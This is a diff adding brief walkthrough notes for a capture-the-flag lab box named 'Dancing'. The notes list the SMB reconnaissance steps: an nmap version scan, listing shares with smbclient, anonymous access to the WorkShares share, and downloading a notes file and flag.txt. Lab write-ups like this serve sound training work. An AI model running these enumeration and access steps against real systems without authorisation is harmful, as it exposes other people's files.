@@ -1,0 +1,27 @@
+DANCING:
+----------------
+
+Server Message Block - smb - smbclient - 445
+
+1- nmap:
+----------------
+nmap -sV 10.129.157.218
+
+2- smbclient:
+----------------
+	smbclient -L 10.129.157.218 -> List of of shares available.
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk  
+	
+3- smbclient share:
+----------------
+	smbclient \\\\10.129.157.218\\WorkShares -> Access to WorkShares
+
+4- gets:
+----------------
+	get worknotes.txt
+	get flag.txt
